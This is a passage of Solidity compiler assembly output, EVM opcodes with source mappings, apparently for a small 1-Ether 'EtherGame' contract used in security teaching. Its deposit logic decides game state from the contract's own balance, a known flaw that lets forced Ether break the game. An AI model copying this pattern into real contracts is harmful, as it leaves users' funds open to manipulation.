											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "D0E30DB0"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "DFBF53AE"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 88,
											"end": 122,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 88,
											"end": 122,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 88,
											"end": 122,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 88,
											"end": 122,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 88,
											"end": 122,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 88,
											"end": 122,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 88,
											"end": 122,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 88,
											"end": 122,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 160,
											"end": 185,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 160,
											"end": 185,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 160,
											"end": 185,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 133,
											"end": 151,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 88,
											"end": 122,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 88,
											"end": 122,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 88,
											"end": 122,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 122,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 473,
											"end": 691,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 473,
											"end": 691,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 473,
											"end": 691,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 473,
											"end": 691,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 473,
											"end": 691,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 473,
											"end": 691,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 473,
											"end": 691,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 473,
											"end": 691,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 159,
											"end": 465,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 159,
											"end": 465,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 159,
											"end": 465,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 159,
											"end": 465,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 159,
											"end": 465,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 129,
											"end": 150,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 129,
											"end": 150,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 129,
											"end": 150,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 129,
											"end": 150,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 129,
											"end": 150,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 129,
											"end": 150,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 129,
											"end": 150,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 129,
											"end": 150,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 129,
											"end": 150,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 129,
											"end": 150,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 129,
											"end": 150,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 129,
											"end": 150,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 360,
											"end": 392,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 360,
											"end": 392,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 360,
											"end": 392,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 342,
											"end": 393,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 342,
											"end": 393,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 330,
											"end": 332,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 315,
											"end": 333,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 129,
											"end": 150,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 196,
											"end": 399,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 473,
											"end": 691,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 473,
											"end": 691,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 536,
											"end": 542,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 536,
											"end": 542,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 536,
											"end": 542,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 522,
											"end": 532,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 522,
											"end": 542,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 514,
											"end": 557,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 514,
											"end": 557,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 514,
											"end": 557,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 514,
											"end": 557,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 514,
											"end": 557,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 514,
											"end": 557,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 606,
											"end": 608,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 514,
											"end": 557,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 514,
											"end": 557,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 514,
											"end": 557,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 588,
											"end": 609,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 645,
											"end": 647,
											"name": "PUSH",
											"source": 1,
											"value": "A"
										},
										{
											"begin": 625,
											"end": 643,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 625,
											"end": 643,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 625,
											"end": 643,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 618,
											"end": 648,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "2737BA103BB4B73732B9"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "B1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 664,
											"end": 682,
											"name": "PUSH",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 664,
											"end": 682,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 664,
											"end": 682,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 657,
											"end": 697,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 714,
											"end": 732,
											"name": "PUSH",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 714,
											"end": 732,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 514,
											"end": 557,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 514,
											"end": 557,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 514,
											"end": 557,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 514,
											"end": 557,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 514,
											"end": 557,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 514,
											"end": 557,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 514,
											"end": 557,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 514,
											"end": 557,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 514,
											"end": 557,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 514,
											"end": 557,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 514,
											"end": 557,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 571,
											"end": 580,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 571,
											"end": 580,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 586,
											"end": 596,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 586,
											"end": 596,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 609,
											"end": 630,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 609,
											"end": 630,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 571,
											"end": 580,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 571,
											"end": 580,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 609,
											"end": 630,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 586,
											"end": 596,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "tag",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "tag",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 586,
											"end": 635,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 586,
											"end": 635,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 570,
											"end": 635,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 570,
											"end": 635,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 570,
											"end": 635,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 654,
											"end": 658,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 646,
											"end": 683,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 646,
											"end": 683,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 646,
											"end": 683,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 646,
											"end": 683,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 646,
											"end": 683,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 646,
											"end": 683,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1155,
											"end": 1157,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 646,
											"end": 683,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 646,
											"end": 683,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 646,
											"end": 683,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1158,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1194,
											"end": 1196,
											"name": "PUSH",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 1174,
											"end": 1192,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 1174,
											"end": 1192,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1174,
											"end": 1192,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1167,
											"end": 1197,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "2330B4B632B2103A379039B2B7321022BA3432B9"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "61"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1213,
											"end": 1231,
											"name": "PUSH",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1213,
											"end": 1231,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1213,
											"end": 1231,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1206,
											"end": 1256,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1273,
											"end": 1291,
											"name": "PUSH",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 1273,
											"end": 1291,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 646,
											"end": 683,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 953,
											"end": 1297,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 646,
											"end": 683,
											"name": "tag",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 646,
											"end": 683,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 503,
											"end": 691,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 473,
											"end": 691,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 159,
											"end": 465,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 159,
											"end": 465,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 212,
											"end": 221,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 225,
											"end": 232,
											"name": "PUSH",
											"source": 0,
											"value": "DE0B6B3A7640000"
										},
										{
											"begin": 212,
											"end": 232,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 204,
											"end": 262,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 204,
											"end": 262,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 204,
											"end": 262,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 204,
											"end": 262,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 204,
											"end": 262,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 204,
											"end": 262,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1504,
											"end": 1506,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 204,
											"end": 262,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 204,
											"end": 262,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 204,
											"end": 262,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1486,
											"end": 1507,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1543,
											"end": 1545,
											"name": "PUSH",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 1523,
											"end": 1541,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 1523,
											"end": 1541,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1523,
											"end": 1541,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1516,
											"end": 1546,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1582,
											"end": 1609,
											"name": "PUSH",
											"source": 1,
											"value": "596F752063616E206F6E6C792073656E64203120457468657200000000000000"
										},
										{
											"begin": 1562,
											"end": 1580,
											"name": "PUSH",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1562,
											"end": 1580,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1562,
											"end": 1580,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1555,
											"end": 1610,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1627,
											"end": 1645,
											"name": "PUSH",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 1627,
											"end": 1645,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 204,
											"end": 262,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 1302,
											"end": 1651,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 204,
											"end": 262,
											"name": "tag",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 204,
											"end": 262,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 275,
											"end": 287,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 341,
											"end": 353,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 290,
											"end": 311,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 290,
											"end": 311,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 330,
											"end": 353,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 330,
											"end": 353,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 330,
											"end": 353,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 322,
											"end": 370,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 322,
											"end": 370,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 322,
											"end": 370,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 322,
											"end": 370,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 322,
											"end": 370,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 322,
											"end": 370,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1858,
											"end": 1860,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 322,
											"end": 370,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 322,
											"end": 370,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 322,
											"end": 370,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1840,
											"end": 1861,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1897,
											"end": 1899,
											"name": "PUSH",
											"source": 1,
											"value": "C"
										},
										{
											"begin": 1877,
											"end": 1895,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 1877,
											"end": 1895,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1877,
											"end": 1895,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1870,
											"end": 1900,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "23B0B6B29034B99037BB32B9"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
